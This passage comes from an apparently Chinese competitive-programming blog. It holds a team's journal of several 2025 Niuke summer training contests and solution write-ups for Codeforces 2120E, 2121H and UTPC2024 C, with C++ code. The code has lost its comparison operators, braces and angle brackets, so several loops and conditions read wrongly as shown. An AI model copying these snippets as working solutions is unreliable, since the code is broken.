*赛后看讨论，发现第一步的转换正确，在此基础上，每填出一个数，就相当于会对右下角的矩形产生贡献。由于右下角的数不超过 $m$，因此可以进一步转换为放小球问题，在 $n(n - 1)$ 个盒子中放不超过 $m$ 个小球，答案就是 $\\dbinom{n(n - 1) + m}{m}$。 【Zlw】中间辗转了好几题，都有点像数据结构。Sky 看了 E 把我喊过来说这题是很明显的数据结构。想了一会没啥明确的思路，不过看到 $10^5$ 的数据范围和非常难维护的 $p$ 映射，大概能猜到是分块。这个时候 Sky 醒说是卡了 $64 \\rm MB$ 的空间。这个时候大概能猜到是卡 $O(n\\sqrt n)$ 的空间，更加确定是分块。然后能发现整块的贡献与块内 $p\\in [l,r]$ 的数量有关，可以直接乘。于是想到可以块内 $p$ 排序然后二分得到，然后散块是区间和单点查，也很好维护。但是此时复杂度 $O(n\\sqrt n \\log n)$ 并且 $O(\\log n)$ 难以塞进根号内部。想到分块平衡复杂度，于是再开一个分块数组实现 $O(\\sqrt n)-O(1)$ 的区间加单点查。然后想到上面如果开 $O(n\\sqrt n)$ 的前缀和数组也可以做到严格 $O(n\\sqrt n)$，调了调块长再把 int 改成 short 发现空间还是留有余地的。于是很快写完。 【Sky Zlw】Zlw 浅浅看了 B。是个奇妙二分，一开始去算奇怪的限制 WA 了，然后 Sky 说有思路就交给他了。（摆） 观察发现，对于两个数 $s1s2$，如果进制操作里没有直接转换成一个数（进制但是 $0$ 次方）的话，相当于是只有加法乘法操作，得到的答案肯定有 $s1^\\primes2^\\prime$，如果有直接转换成一个数的话，得到的就是 $s1^\\prime=s2^\\prime$，整合起来就是 $s1^\\prime\\leq s2^\\prime$，当然这里前提都是合法进制转换。 直接考虑从$[2,M]$二分答案，对于一个 $mid$，只需要直接模拟它能不能完成进制转换即可。我们可以先二分一个结果不小于 $y$ 的答案，然后再二分第一个结果大于 $y$ 的 $ans_r$，那么答案就是 $ans_l$，$ans_r - 1$。时间复杂度 $O(\\log M \\sum l_i)$。 题目真的不难，但比赛前期中期根本没人做这题，榜都不知道歪到哪里去了，直到最后一小时才发现过这道题的人越来越多，但最后时间不够没有调出来。 【Scyの补题】 G 题没往 dp 上想。设 $dp_i$ 来表示 $\\texttt{L}$ 的复位时间，再设 $g_i$ 表示 $[1,i]$ 中 $\\texttt{R}$ 的个数。由于 $\\texttt{LL…}$ 的情况会造成排队效应，于是有表达式 $dp_i = \\max (dp_{i - 1},g_i)$。不难想到可以用 ddp 来维护 $\\max+$ 矩阵。 具体来说，若当前为 $\\texttt{L}$，则矩阵可以描述为 \\begin{bmatrix} 1 & -\\infty \\\\ 0 & 0 \\end{bmatrix}若当前为 $\\texttt{R}$，则矩阵可以描述为 \\begin{bmatrix} 0 & -\\infty \\\\ -\\infty & 1 \\end{bmatrix}最后的时间复杂度为 $O(n + q \\log n)$。 2025牛客暑期多校训练营7 【省流版】 $5/10$ 题，$\\texttt{rank 224/1501}$，下分了 qwq。 【Scy】发现 C 是签到，发现只要维护当前最大值与元素差之和即可，直接开写，一发通过。 【Scy】继续看了 F，没啥想法。猜了个每次减去 $\\lfloor\\frac{\\text{average}}{n}\\rfloor$ 的暴力发现最后 $0$ 和 $1$ 出现的异常多，但是此时还没想到结论。这时候，Zlw 突然点出答案可能就是奇数个数与偶数个数的乘积。 $\\texttt{12:39:17}$ 第一发提交，WA！ 【Scy】啊呀，忘记开 long long 了！ $\\texttt{12:39:44}$ 第二发提交，WA！ 【Scy】啊呀，忘记取模了！ $\\texttt{12:41:49}$ 第三发提交，AC！ 【Scy】我是罪人！呜呜呜呜…… 好吧，赛后仔细想了一下，好像还是挺好证明的！ 【Sky】G 的题目大意：给定偶数 $n$，构造 $\\{1, 2, \\cdots, n\\}$ 的子集 $S$ 使得大小为 $\\frac{n}{2}$ 且 $\\forall x, y, z \\in S$（可以相等），$xyz$ 不是完全平方数。 观察到完全平方数一定是 $a^{2k}, k \\in \\mathbb{N}$，那么尝试去构造一些质因数次方和全是奇数的数，这样任选三个乘起来也都是奇数次方，就不会是完全平方数。 考虑先提取所有质数，标记为 $\\text{true}$，次方都为 $1$，然后因为题目给了范围是 $2 \\leq n \\leq 10^6$，可以遍历做 $O(n)$ 算法。记录一个 $\\text{ans}$ 动态数组，从 $2$ 开始，如果曾经被标记为 $\\text{true}$，直接加入 $\\text{ans}$，并将其固定，即至少选这一个质数，剩下的两个数从现有的 $\\text{ans}$ 里面随便选（可相同），乘起来并标记为 $\\text{true}$，这样就能生成一个质因数次方和全是奇数的数列。 整体理论复杂度是 $O(n^3)$ ，但是 $\\text{ans}$ 具有单调性，在遍历过程中可以有乘积 $\\geq 10^6$ 直接剪枝，所以最后实际上大概只会跑到 $O(n)$，预处理 $\\text{ans}$ 然后输出即可。 Scy 开始以为时间复杂度会爆，但是测了一下跑得异常快，一发 AC！（Scy 在利用 $x^2 \\equiv 2 \\pmod 3$ 不存在的性质乱搞，还没弄出来就被 Sky 切掉了%%%）） 【Zlw】初看 J 想到有效的质因数个数是 $O(\\log w)$ 但是比较难分解质因数，于是想到是否可以用破腊肉，于是抄了一个板子，然后修改一下发现 TLE 了，在卡常路上一去不复返。直到某一刻经过 Sky 的提醒，发现貌似可以通过 $\\min\\{ \\frac{\\max\\{a,c\\}}{\\gcd(a,c)},\\gcd(a,c)\\}\\leq 10^9$，然后思考是否有分类讨论平衡复杂度的说法。在推式子的过程中发现： $\\gcd(x^bG^b,y^dG^d)=G^{d}\\gcd(x^bG^{b-d},y^d)$ ，发现 $\\gcd(x,y)=1\\rightarrow \\gcd(x^bG^{b-d},y^d)=\\gcd(G^{b-d},y^d)$，于是得到一个可以辗转的式子，试了一下发现可以过，然后又发现由于底数每次都除掉一个大于 1 的数，所以复杂度是 $O(\\log w)$，再乘上计算 $\\gcd$ 的复杂度总复杂度 $O(T\\log^2 w)$ 于是通过。 【Sky Scy】Sky 先尝试了这道题。A 是一道非常神秘题，Alice 可以旋转 $4 \\times 4$ 的矩阵，Bob 则是纯随机。我先写了个暴力想找规律，但是可能角度不太对，因为我发现左上角的 $1$ 在 Alice 旋转无限次数之后到任意一个位置的概率是相等的，那 Alice 难道也是生成的随机矩阵吗？ 其实不然。这时候孙✌提醒我，其实是一个条件概率问题，不能单独拿出每一个数来算概率,要找相对关系。 然后 Scy 开始尝试乱搞。想着就是旋转会出现什么性质，使得只有 Alice 的旋转是不会变的。猜了几个东西然后猜到逆序对。考虑到行和列都在变化，所以猜测整一个数组的逆序对。用 Sky 写的暴力输出了一下逆序对的情况，惊讶地发现都是偶数，于是果断写然后提交，通过了！ 【Zlw Scy】尝试推了 I 题，很显然是一个矩阵快速幂的优化题。但是算概率并不是那么容易，Scy 和 Zlw 的式子均没有通过暴力。由于时间不足，最后并没有探出正解。（应该往方案数统计的方向上靠，从而进一步地得到期望） 2025牛客暑期多校训练营8 【省流版】这一周普遍打得都不是很理想，有题目想偏无法拉回导致大方向把控不佳。$5/11$ 题，$\\texttt{rank 220/1490}$。 【Zlw】A 是签到题，很简单的枚举，稍微写写细节过了。 【Scy】 C 也是签到，结合物理模型分析，平抛路程的 $x$ 是关于 $H$ 的上凸函数，直接关于对称轴的距离排序即可。 【Scy】他俩在看 J，我先看了 F。首先先预处理出了每一个灯管有哪些数字是亮的，然后对于每一位设状态，看哪些灯管亮起时可以覆盖所有的情况。随便写了一下就过样例，交了以后 WA。手模了几个发现形如 $\\texttt{012}$ 与 $\\texttt{234}$ 这种数位不能独立去看，因为这组数据只需要一个灯管即可区分，也就是 $2^{7m}$ 的状态，直接状压肯定超时，于是先没有继续写下去。 【Sky】J 题目给了一个 $\\sqrt{-2}$ 进制的定义，让你去算两个数在 $\\sqrt{-2}$ 进制下的乘法。 考虑到数据范围很大， $\\sum{(|A| + |B|)} \\leq 2 \\times 10^6$ ，即使是简单的乘法也需要 $O(|A| \\cdot |B|)$ ，不能再时间范围内通过。 观察到 $A \\times B$ 在 $\\sqrt{-2}$ 进制下的乘法其实就是： a_1 (\\sqrt{-2})^0 + a_2 (\\sqrt{-2})^1 + \\cdots + a_n (\\sqrt{-2})^{n-1}乘上 b_1 (\\sqrt{-2})^0 + b_2 (\\sqrt{-2})^1 + \\cdots + b_m (\\sqrt{-2})^{m-1}快速多项式相乘，考虑 FFT。 现场去找了个板子，乘完之后再做 $\\sqrt{-2}$ 进制下的进位处理，简单模拟一下就过了。 题目其实思路不算难，但一开始一直在想不用 FFT 的做法，浪费了些时间，也想不到，就直接上机写了。 【Scy】$\\color{red}\\large{注意到 \\texttt{ Sky } 忘记多组数据清空以及用 \\texttt{ memset } 贡献了两发罚时！！！}$ 【Zlw】B 很快的发现区间 shift 只有当连段变动的区间长度都是奇数才会翻转奇偶性，但是一开始完全没注意到它的“数据生成”还藏了结论。以为可以硬算逆序对数，陷入了空间陷阱里，测算使用 $24\\rm B$ 存一个整数可以把空间压到约 $30\\rm MB$，手模了一个实测发现空间在 $\\rm [32MB,34MB]$ 波动，非常炸裂。此时浪费了很多时间，才开始去想交换是否也有性质，然后发现只要不是 $i=f_i$ 都会翻转奇偶性，然后写了写过了。$\\color{red}\\large{浪费了很多时间在非正解卡空间上}$。 【Scy】到很后面才继续思考 F，发现有效的状态似乎并不多，而且答案最大也就是 $7m$。于是尝试剪枝搜索，记录下一个数 $i$ 受到影响的灯管状态 $S_i$，如果要区别两个数字，则最终答案的状态 $T$ 满足 $(T \\ (S_i \\oplus S_j)) eq 0$ 即可。另外还加了一个 $S_i \\oplus S_j$ 的去重和答案的最优性剪枝。测了一下极限数据，发现跑得很快，提交通过。哎本来第一发提交是 $00:45$，再多思考十几分钟就能通过，现在增加两个多小时的罚时。 【Zlw Sky Scy】一开始 Sky 和 Scy 在讨论这道 G。Sky 发现当两点间原来不相连时，贡献为路径上最大值 $-1$，但是 $O(n^2)$ 且没考虑多个最小生成树的清空。Zlw 感觉有点迷，插了一嘴说是可以用 Kruskal 然后加点计数。Scy 认同了我的做法，然后再经过验证没有发现什么问题，于是我上机开写。但是后面发现想要去掉一条无效边的贡献还需要知道这条边最先被删除的时间。我很快有了一个二分+可持久化并查集的想法，但是 $3$ 个 $\\log$ 且特别麻烦被 Scy 骂了。发现可以离线，于是提出整体二分，此时 Scy 还没有其它思路，于是我先写了。再结束前 5min 写完，但是有一个地方没有开 long long，还有一个地方没判 $m=0$ 死循环了赛后还调了一年。 赛后 Scy 用另外一个单 $\\log$ 算法通过了。就是按照之前的思路 就是先不减去那些原来有的边的贡献，即 $(w_i - 1) \\times sz_x \\times sz_y$，然后之后按照 Sky 的思路，看原来就有的边 $(u,v)$ 是多算的值，显然就是最小生成树上这条路径的 $\\max - 1$。先用 Kruskal 后用树上倍增维护最大值即可。还因为放错倍增位置导致 WA 了很久。 2025牛客暑期多校训练营9 【省流版】继续坠机，G 题 300 多的过题数但是做不出，最后两小时转战 B 但无力回天。以及，榜再次歪，B 题解里写的是 hard。$5/13$ 题，$\\texttt{rank 378/1458}$。 【Zlw】M 开局一分钟就有人通过，于是写了个暴力发现 $n9$ 无解，交上去过了。 【Sky】J 是签到题，读了好几遍才敢写，每行后面加个 nya 即可。猫娘可爱。 【Scy】L 读了会儿题，感觉还是可做的。还没仔细想就被 Zlw 佬叫去一起看 F。F 一看就是 $O(1)$ 结论题，和 Zlw 讨论了一会儿认为要疯狂分类讨论。在草稿纸上画了一会儿，但越分越乱，迟迟无法上机。 之后想着旋转会导致曼哈顿距离的 $|\\Delta| = 1$，因此只需要终点两个坐标的 $x,y$ 之和与起点的坐标作差，后取 $\\max$ 即可（其实就相当于题解里的旋转操作）。一发 WA，发现忘记开 long long 了，修改后提交通过。 【Zlw Sky】Zlw 本来先看了 G 没什么思路，然后 Sky 在看 A，看了一下发现如果要加点，操作数增长的很快。然后画了一下图找了会规律，找到了一个错误的规律（没想着去严谨推，是个败笔），以为是按照根号增长的。然后忐忑的写了一个根号的 dp，交上去 WA 了，又查了好几个样例才发现加点的式子推错了，严谨地写成了 $f_i=f_{i-1}+f_{i-2}+1$，这回正确性没问题了，但是中间有个地方没有把根号层改掉，又罚多了一次时。 具体来说，考虑尽量去构造每个节点的 $|h_{ls_u} - h_{rs_u}| \\leq 1$，形成一棵 AVL 树。 观察上面这幅图，可以发现 AVL 树深度为 $1$ 的时候，只需要蓝色一个节点，深度为 $2$ 的时候，需要蓝色和橙色，深度为 $3$ 的时候需要蓝色、橙色和绿色一共 $4$ 个节点。以此类推，我们观察到，AVL 树的深度和所需要的节点有很强的关系。实际上，再想一步就可以得到，想要当前 AVL 树的深度 $h_i$ 加 $1$，我们只需要在这个树的根节点上面加一个节点，新的根节点的另一个子树深度为 $h_i-1$ 即可满足 AVL 树的条件。 这样下来发现其实是近似斐波那契数列，有式子 $f_i = f_{i-1} + f_{i-2} + 1$ 然后再从根节点从上往下跑一个 dp 即可，dp 的部分被 Zlw 佬秒了，但是佬一开始数列搞错了，纠正后 AC。 【Scy Zlw】拼好题。子序列的 dp，疑似从后面计算日期的数量，然后从前面计算年份的数量。 Zlw 先提出可以先用 $12 \\times 31 \\times n$ 的时间算出 $[i,n]$ 强制选 $i$ 时合法日期的数量。设 $f_{i,0/1/2/3,M,D}$ 表示考虑 $[i,n]$ 时填月与日中的第 $0/1/2/3$ 位时，月份为 $M$，日期为 $D$，同时强制选 $i$ 时的合法日期数量。最后发现代码在很多细节上出了问题，又调试了好久。 Scy 发现可以用 $O(n)$ 的时间算出 $[1,i]$ 中合法的闰年的数量。主要需要考虑的是被 $100$ 整除的情况。设 $one_{i,j},two_{i,j}$ 表示第 $i$ 位为 $j$，作为年份的千/百位时的数量，均为 $0$ 时注意特判不合法。直接类似前缀和的思想一位一位的推过来，然后计数。 for (int i = 1;i = n;++i) pre[i] = pre[i - 1]; if (!a[i]) pre[i] = (pre[i] + third) % MOD; for (int o = 0;o 10;++o) third = (third + two[o]) % MOD; if (a[i] % 4 == 0) two[a[i]] += (one[0] + one[2] + one[4] + one[6] + one[8]) % MOD; two[a[i]] %= MOD; if (!a[i]) two[a[i]] = (two[a[i]] - one[0] + MOD) % MOD; if (a[i] % 4 == 2) two[a[i]] += (one[1] + one[3] + one[5] + one[7] + one[9]) % MOD; two[a[i]] %= MOD; ++one[a[i]]; 【*】由于 G 三人都无想法，最后遗憾五题离场。本来是可能有时间写别的题的，但是有人不会判断闰年，把暴力代码写错了，于是疯狂对着一份其实早已正确的代码调试，2.5 h 才过了 B。 Sky 有言： 我觉得吧，一道题就应该一个人写，拼好题可以拼思路！我觉得吧，我们至少先落实一个事情，就是每个人都看一遍每道题，一场比赛至少得把所有题看一遍。$\\tiny\\text{我觉得吧，打成这样肯定是因为 Zlw 与 Scy 太依靠 Sky 佬过题了！}$ 【Scy の补题】 G 简直为笛卡尔树量身定制。设最后一个删除的数为第 $i$ 个数，则最后剩余区间一定是 $[l,r] (l \\le i \\le r)$，其中 $r - l + 1$ 即为建立完笛卡尔树后 $i$ 节点的子树大小 $sz_i$。因此，可以留出不超过 $sz_i - 1$ 个位置给区间外的数，每层只可能有 $1$ 个。由插板法可知答案为 $\\sum \\limits _{k = 0}^{sz_i - 1}\\binom{k + dep - 1}{dep - 1}$。 下面来推个式子： \\sum \\limits _{k = 0}^{sz_i - 1}\\binom{k + dep - 1}{dep - 1} = \\binom{dep - 1}{dep - 1} + \\binom{dep}{dep - 1} + \\cdots + \\binom{dep + sz - 2}{dep - 1} \\\\ = \\binom{dep}{dep} + \\binom{dep}{dep - 1} + \\cdots + \\binom{dep + sz - 2}{dep - 1}又因为 \\binom{n - 1}{m - 1} + \\binom{n - 1}{m} = \\binom{n}{m}所以最后第 $i$ 个数作为最后一个数删除的方案数为 $\\binom{dep + sz - 1}{dep}$。最后还需要加上全部为空的情况，贡献为 $1$。 2025牛客暑期多校训练营10 【省流版】好消息：两小时不到就五题了！坏消息：五小时以后还是五题！$5/12$ 题，$\\texttt{rank 205/1391}$。 【Zlw Scy】开局 Zlw 写了 D，发现如果连续两位相等必然出现信息丢失，问了下 Scy 和 Sky 说是三次交替异或可以交换。但是一开始忽略了交换两次又换回来了，以为是 $n \\bmod 3=1$ 然后答案错误。看了半天没看出问题，叫 fw Scy 过来看看。Scy 想了很久突然发现 Zlw 佬把交换偶数次（相当于又换回来了的情况）也算到答案里了，修改成 $n \\bmod 6=4$ 以后通过。 【Zlw Sky】H 一道简单小题。考虑式子为 a()b=，其中括号里能填 +、-、*，为了得到最短对称，分情况讨论一下即可。很快发现并证明了加法和乘法合法的充要条件是 $a eq b$。a 和 b 相同的时候一定是 =a()a=，即不合法。不同的时候再考虑 a()b=b()a，长度为 7。但是由于通过率特别低，一直在找反例。中间忍不住交了一发罚时。最后实在没办法暴力枚举减法的所有情况，发现 $a=0$ 存在特例。然后又由于一个低级失误罚了一次时。 【Scy】发现 I 是构造，观察到矩阵性质特别强，每次都需要跳对应的数量。看了题目后外卖到了，于是右手吃饭，左手纸笔迷题，然后就突然发现好像玩出来了。令 $n m$，从左上角开始，按数字顺序先向下跳，再向上跳，每一列跳满了之后再向左/右跳。试了一下，算法正确，然后猜想无解可能是自然的。Sky 通过同余方程证明出 $\\gcd (n,m) = 1$ 时才有解，和我的猜想殊途同归。一发提交后 AC。 【Zlw】比较清秀的数据结构题，Scy 在写构造的时候看了一下，很快发现枚举 $b_2$ 再去维护每个 $b_3$ 的答案就好了，写个线段树过了。 【Scy Zlw】Zlw 先看了 E，想到 $m = 1$ 时直接贪心归一到最大值即可。然后又提出 $m = 2$ 时是一个最大值，一个其他值。然后 Scy 把这个想法 hack 了，反例是 5 1 1 1 10 1 1，这时候两个数显然为 $5,14$。 想了一会儿，觉得可以直接枚举这两个值，上界在 $2\\max\\{a_i\\}$，然后设 $dp_{i,0/1}$ 表示第 $i$ 个数最后为枚举的前者/后者的值时的最小答案。若前面操作次数不小于当前数字所需的次数，则直接“免费”，总次数变为较小值；否则花费次数为 $\\Delta$，总次数为当前值。 Zlw 确认了 Scy 的做法，枚举两个最终值然后 $O(n)$ 跑一遍 DP 就好。由于 Zlw 比较擅长 DP，于是直接甩锅给他来写了，一发 AC。 【Scy】吸取上次的教训，决定题目都看一下，看了 A,C,J。A 是纯大模拟，实现格式化程序的功能。题目超级难懂，大概看了 30 min 才似懂非懂，但是由于细节太多了，迟迟不敢下手，以至于到比赛结束也没写（不过赛时只有 4 个队伍通过了这道题）。C 是搜索+构造题，构造需要花费很长时间，除非爆搜，最后也没写。（主要是想了一会儿一起去看 K 了，如果剩下三小时去写这道题或许能够构造出来。但是这题据说网上也能找到现成的答案，有点迷惑。至于爆搜，直接用哈希的方式来映射这 $60$ 种积木块即可。J 的话也有构造+计算几何的味道，写不了。） 【Zlw Sky】K 题意有点模糊，考虑先用 Tarjan 缩点，然后再进行一个子树计算合并，式子是 $C = \\{x+y, x \\in A, y \\in B\\} \\cup A \\cup B$。发现缩点完以后还是一棵树，理论上可以直接类树形背包。但是这个时候忘了树形背包的经典结论可以扩展到任意物品重量，一直以为是三次方，甚至开始尝试 bitset 和 NTT，最后还是没卡过去。赛后发现直接做就是对的。 【后记】 总排名规则：$\\color{purple}{单场得分 = 100 \\times\\frac{解题数}{第一名的解题数}\\times \\frac{2\\times 本场参赛队伍数-2}{本场参赛队伍数+名次-2}}$。总排名按分数最高的 5 场之和，参赛不足 5 场的队伍，按所有参赛场次的得分之和计算。 海外邀请来的选手不计入总排名。 前 $10\\%$ 是 $173$ 名，我们 $\\texttt{rk }230$，勉强吧！","categories":["Journal"]},{"title":"题解：CF2120E Lanes of Cars","path":"/2025/06/29/CF2120E/","content":"根据贪心，不难想到每次会把最长队伍末尾的那辆车移动到最短队伍的末尾。但由于 $k$ 的存在，会导致一些冗余移动的存在。设需要挪动 $C$ 辆车，则怒气值可以表示为 $f(C) + kC$，其中 $f(C)$ 是排队所产生的怒气值，$kC$ 为变道产生的额外怒气值。仔细分析以后，可以发现这是一个凸函数，因此考虑三分答案。 一开始想要三分需要挪车的最短长度 $y$，但是不能忽略 $k$ 的影响，有些队伍的长度虽然 $ y$，但挪动不移动会更优。于是三分挪动车辆的数量才是最优的。 具体来说，可以枚举哪些队伍的车辆会减少/增加。若现在考虑会减少的队伍的车辆，给 $a_i$ 排序后，设当前最长队伍的车辆数为 $x$，次长的为 $y$ ($x eq y$)，然后长度为 $x,y$ 的队伍的数量分别为 $f_x,f_y$。若共需要移动 $C$ 辆车，则有两种情况: $C \\ge (x - y) \\times f_x$，也就是说长度为 $x$ 的车可以直接变为 $y$，$C \\leftarrow C - (x - y) \\times f_x; f_y \\leftarrow f_x + f_y; f_x \\leftarrow 0$。 $C (x - y) \\times f_x$，此时会产生新的队伍长度，也就是 $C \\leftarrow 0; f_{x - \\lfloor\\frac{C}{f_x}\\rfloor - 1} \\leftarrow f_{x - \\lfloor\\frac{C}{f_x}\\rfloor - 1} + C \\bmod f_x; \\leftarrow f_{x - \\lfloor\\frac{C}{f_x}\\rfloor} + (f_x - C \\bmod f_x)$。 可以发现最后队伍长度的种类数不会超过 $n + 2$，因此这是 $O(n)$ 的。考虑增加的队伍的车辆同理，用 STL 来写会简单一点。但是由于多了一支 $\\log$，实测会超时： ll tot = sum * k,res = sum,number = sum;set int s;map int,int bg,sm;s.insert (-1e9);for (int i = 1;i = n;++i) s.insert (a[i]),++bg[a[i]];while (sum) int x = *(--s.end ()),num = bg[x];s.erase (x); int y = *(--s.end ()); if (sum = 1ll * (x - y) * num) sum -= 1ll * (x - y) * num; bg[y] += num;bg[x] = 0; else bg[x] = 0; int tmp = sum % num; if (tmp) bg[x - sum / num - 1] += tmp; bg[x - sum / num] += num - tmp; sum = 0; s.clear ();for (auto [x,num] : bg) if (num) s.insert (x),sm[x] = num;s.insert (1e9);while (res) int x = *s.begin (),num = sm[x];s.erase (x); int y = *s.begin (); if (res = 1ll * (y - x) * num) res -= 1ll * (y - x) * num; sm[y] += num;sm[x] = 0; else sm[x] = 0; int tmp = res % num; if (tmp) sm[x + res / num + 1] += tmp; sm[x + res / num] += num - tmp; res = 0; for (auto [x,num] : sm) tot += 1ll * x * (x + 1) / 2 * num;return tot;; 再次思考可以发现 STL 的 $\\log$ 完全是多余的，可以通过数组来替代，但需要小心清空与去重的问题。最后的 AC 代码如下，时间复杂度 $O(n \\log n)$： #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 2e18#define pii pair int,intusing namespace std;const int MAX = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();int a[MAX],b[MAX];vector int bg (1000001,0),sm (1000001,0);void solve () int n = read (),k = read ();ll ans = INF; for (int i = 1;i = n;++i) a[i] = read (); sort (a + 1,a + 1 + n); auto check = [] (ll sum) - ll ll tot = sum * k,res = sum;int cnt = 0; vector int p; for (int i = 1;i = n;++i) p.push_back (a[i]); for (int i = 1;i = n;++i) if (!bg[a[i]]) b[++cnt] = a[i]; ++bg[a[i]]; b[0] = -1e9; while (sum 0) int x = b[cnt--],num = bg[x]; int y = b[cnt]; if (sum = 1ll * (x - y) * num) sum -= 1ll * (x - y) * num; bg[y] += num;bg[x] = 0; else bg[x] = 0; int tmp = sum % num; bg[x - sum / num] += num - tmp,p.push_back (x - sum / num); if (tmp) bg[x - sum / num - 1] += tmp,p.push_back (x - sum / num - 1); sum = 0; cnt = 0; for (auto v : p) if (bg[v]) b[++cnt] = v,sm[v] = bg[v],bg[v] = 0; p.clear (); for (int i = 1;i = cnt;++i) p.push_back (b[i]); b[++cnt] = 1e9;cnt = 1; while (res 0) int x = b[cnt++],num = sm[x]; int y = b[cnt]; if (res = 1ll * (y - x) * num) res -= 1ll * (y - x) * num; sm[y] += num;sm[x] = 0; else sm[x] = 0; int tmp = res % num; if (tmp) sm[x + res / num + 1] += tmp,p.push_back (x + res / num + 1); sm[x + res / num] += num - tmp,p.push_back (x + res / num); res = 0; for (auto v : p) tot += 1ll * v * (v + 1) / 2 * sm[v],sm[v] = 0; return tot; ; ll l = 0,r = accumulate (a + 1,a + n + 1,0ll); while (l r) ll midl = l + (r - l) / 3,midr = r - (r - l) / 3; ll v1 = check (midl),v2 = check (midr); ans = min (ans,min (v1,v2)); if (v1 = v2) r = midr - 1; else l = midl + 1; printf (%lld ,ans);int main () int t = read (); while (t--) solve (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：CF2121H Ice Baby","path":"/2025/06/26/CF2121H/","content":"设 $f_i$ 表示答案长度为 $i$ 时，结尾的最小值。因此当 $f_{i - 1} \\le r_i$ 时可以进行转移 $f_i = \\max (f_{i - 1},l_i)$。于是可以得到 $O(n^2)$ 的代码： for (int i = 1;i = n;++i) for (int j = i;j;--j) if (dp[j - 1] r[i]) continue; dp[j] = min (dp[j],max (dp[j - 1],l[i])); ans = max (ans,j); coutans [i == n]; 按照官方题解的思路可以用 multiset 优化到 $O(n \\log n)$，在此不赘述。 换一种角度，设 $f_i$ 表示最后一个数字为 $i$ 时的最大长度。则在遇到第 $k$ 个区间 $[l_k,r_k]$ 时，有 $f_{l_k} = \\max\\limits_{j \\mid j \\le l_k}\\{f_j\\} + 1$，线段树维护最大值即可。而 $f_{l_k + 1} \\sim f_r$ 就可以保持原来的数字不变，相当于区间加一。最后的答案就是全局最大值。 又因为值域较大，需要先进行离散化操作。最后，我们可以得到线段树优化到 $O (n \\log n)$ 代码： #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3f#define pii pair int,intusing namespace std;const int MAX = 4e5 + 5;const int MOD = 1e9 + 7;inline int read ();int tree[MAX 2],tmp[MAX 2];void pushup (int cur) tree[cur] = max (tree[cur 1],tree[cur 1 | 1]);void pushdown (int cur) if (!tmp[cur]) return ; tree[cur 1] += tmp[cur];tree[cur 1 | 1] += tmp[cur]; tmp[cur 1] += tmp[cur];tmp[cur 1 | 1] += tmp[cur]; tmp[cur] = 0;void build (int cur,int l,int r) tree[cur] = tmp[cur] = 0; if (l == r) return ; int mid = (l + r) 1; build (cur 1,l,mid);build (cur 1 | 1,mid + 1,r);void modify1 (int cur,int l,int r,int x,int v) if (l == r) tree[cur] = v;return ; int mid = (l + r) 1; pushdown (cur); if (x = mid) modify1 (cur 1,l,mid,x,v); else modify1 (cur 1 | 1,mid + 1,r,x,v); pushup (cur);void modify2 (int cur,int l,int r,int x,int y) if (y l || x r) return ; if (x = l y = r) ++tree[cur];++tmp[cur];return ; int mid = (l + r) 1; pushdown (cur); if (x = mid) modify2 (cur 1,l,mid,x,y); if (y mid) modify2 (cur 1 | 1,mid + 1,r,x,y); pushup (cur);int query (int cur,int l,int r,int x,int y) if (y l || x r) return 0; if (x = l y = r) return tree[cur]; int mid = (l + r) 1,res = 0; pushdown (cur); if (x = mid) res = max (res,query (cur 1,l,mid,x,y)); if (y mid) res = max (res,query (cur 1 | 1,mid + 1,r,x,y)); return res;void solve () int n = read (); vector int l (n + 1),r (n + 1),num; for (int i = 1;i = n;++i) l[i] = read (),r[i] = read (),num.push_back (l[i]),num.push_back (r[i]); sort (num.begin (),num.end ()); num.erase (unique (num.begin (),num.end ()),num.end ()); int tot = num.size ();build (1,1,tot); //f[i] 表示最后一个数字为 i 时的最大长度 for (int i = 1;i = n;++i) l[i] = lower_bound (num.begin (),num.end (),l[i]) - num.begin () + 1; r[i] = lower_bound (num.begin (),num.end (),r[i]) - num.begin () + 1; modify1 (1,1,tot,l[i],query (1,1,tot,1,l[i]) + 1); modify2 (1,1,tot,l[i] + 1,r[i]); couttree[1] [i == n]; int main () int t = read (); while (t--) solve (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：[UTPC2024] C.Card Deck","path":"/2025/06/07/UTPC2024C/","content":"题目链接，感觉是计数神题。 原题的模型是每一步可以选择顶部 $k$ 张牌的一个子集 $X_i$(可以为空）放在袋中，求 $m$ 轮之后所有可能的袋子里牌所组成的集合的大小之和。考虑进行转化，只考虑前 $k$ 张牌，每张牌都有一个属性 $t_i \\in \\{0,1,\\cdots,m\\}$。若 $t_i = 0$，表示这张牌永远不会被放入袋子中，否则表示这张牌会在第 $t_i$ 轮被放入袋子中。若 $S_j$ 表示第 $j$ 轮后袋子里的数，最后求 $\\sum \\limits_{i = 1}^m |S_j|$。 设两个模型为 $A,B$，下证明两个模型等价。 证明 $A \\to B$\\对于 $\\forall i \\in [1,k]$，若 $i \\in X_j$ 则有 $t_i = j$，否则 $t_i = 0$。 $B \\to A$\\在进行第 $j$ 步前，所有 $t_i j$ 的牌都已经放入袋中，总共有 $|\\{i \\mid t_i j\\}|$ 张。由于放入袋中后会进行补位，也就是说我们并不关心补进来的是哪一张真正的原始牌，当进行第 $j$ 步前，牌堆的前 $k$ 张牌一定存在所有 $t_i = j$ 的牌，也就是说第 $j$ 步删掉 $\\{i \\mid t_i = j\\}$ 是合法操作。 因此可以对每一张牌单独计算贡献。也就是 $\\sum \\limits_{i = 1}^m |S_j| =\\sum \\limits_{i = 1}^k \\textbf{1}_{t_i 0} = \\sum \\limits_{i = 1}^k t_i$。共有 $k$ 张牌，所有合法的 $\\{t_i\\}$ 的方案数为 $(m + 1)^k$。强制令 $t_i = j$，则这张牌的贡献为 $(m + 1)^{k - 1}$。由于 $t_i \\in \\{0,1,\\cdots,m\\}$，则这张牌出现在集合里的次数为 $(0 + 1 + \\cdots + m) \\times (m + 1)^{k - 1}$，即 $\\frac{m(m + 1)^k}{2}$。再由于 